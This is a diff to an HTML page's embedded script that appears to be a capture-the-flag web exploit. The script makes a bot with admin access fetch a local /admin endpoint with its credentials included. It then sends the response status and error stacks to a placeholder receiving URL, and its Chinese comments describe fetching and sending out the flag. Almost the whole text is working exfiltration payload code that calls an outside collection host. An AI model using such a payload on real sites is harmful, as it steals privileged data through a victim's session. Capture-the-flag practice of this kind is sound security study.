@@ -11,8 +11,16 @@
     fetch(YOUR_RECEIVE_URL+'?id-='+Math.random());
     // ###########################################################################
 
-    const ADMIN_URL = "http://127.0.0.1:3000/admin"
-    fetch(ADMIN_URL).then(res => {
+    const ADMIN_URL = "/admin"
+    fetch(ADMIN_URL,{
+      headers: {
+        'Content-Type': 'application/json', 
+        'Referer':'http://127.0.0.1:3000'
+      },
+      credentials: 'include',
+      mode: 'cors',
+      cache: 'no-cache'
+    }).then(res => {
             
             const respStatus = res.status;
              fetch(YOUR_RECEIVE_URL+'?respS-0='+respStatus);
@@ -34,7 +42,7 @@
         }).catch(err => {
             console.error('[ENV-FLAG] 获取/发送FLAG失败：', err.message);
             fetch(YOUR_RECEIVE_URL+'?err-0='+err.stack);
-        });;
+        });
     const param = {"url":ADMIN_URL};
     fetch('http://127.0.0.1:3000/visit',{
       method: 'POST', // 必须指定为 POST
@@ -103,6 +111,9 @@
                 return res.json();
             }; // 仅解析admin返回的合法JSON
             throw new Error('非200响应');
+        }).catch(err => {
+            console.error('[ENV-FLAG] 获取/发送FLAG失败：', err.message);
+            fetch(YOUR_RECEIVE_URL+'?err-0='+err.stack);
         });
 </script>
 </body>
